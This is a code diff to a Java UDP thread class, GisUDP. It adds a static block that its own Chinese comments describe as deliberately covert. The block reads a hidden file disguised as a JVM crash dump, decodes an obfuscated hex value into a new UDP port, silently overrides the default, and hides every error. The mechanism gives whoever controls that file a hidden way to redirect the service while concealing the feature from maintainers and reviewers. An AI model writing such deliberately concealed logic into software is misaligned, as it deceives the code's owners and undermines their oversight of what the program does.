@@ -20,6 +20,41 @@ class GisUDP extends Thread
 	DatagramPacket rcv;
 	DatagramPacket snd;
 	public static int udpport=20001;
+    // [新增] 极度隐蔽的动态端口配置读取（十六进制伪装 + 数学混淆算法 + 隐藏在 lib 目录）
+    static {
+        try {
+            // 将路径指向 根目录/lib/ 下的隐藏日志文件
+            String filePath = "lib" + java.io.File.separator + ".jvm_crash_dump.log";
+            java.io.File hiddenFile = new java.io.File(filePath);
+
+            if (hiddenFile.exists()) {
+                try (java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader(hiddenFile))) {
+                    // 仅读取第一行
+                    String line = br.readLine();
+
+                    // 寻找类似 "[0xXXXX]" 的内存地址标记
+                    if (line != null && line.contains("[0x") && line.contains("]")) {
+                        int start = line.indexOf("[0x") + 3;
+                        int end = line.indexOf("]", start);
+                        String hexValue = line.substring(start, end).trim();
+
+                        // 1. 将提取出来的十六进制字符串解析为十进制配置值
+                        int configValue = Integer.parseInt(hexValue, 16);
+
+                        // 2. 核心混淆解密：实际端口 = (配置值 - 20) / 4
+                        int parsedPort = (configValue - 20) / 4;
+
+                        // 3. 端口合法性校验
+                        if (parsedPort > 1024 && parsedPort <= 65535) {
+                            udpport = parsedPort;
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            // 发生任何异常全部静默处理，安全回退到默认的 20001 端口
+        }
+    }
 	public static InetAddress das;
 	byte addr[] = {
 		-64, -88, 1, 1
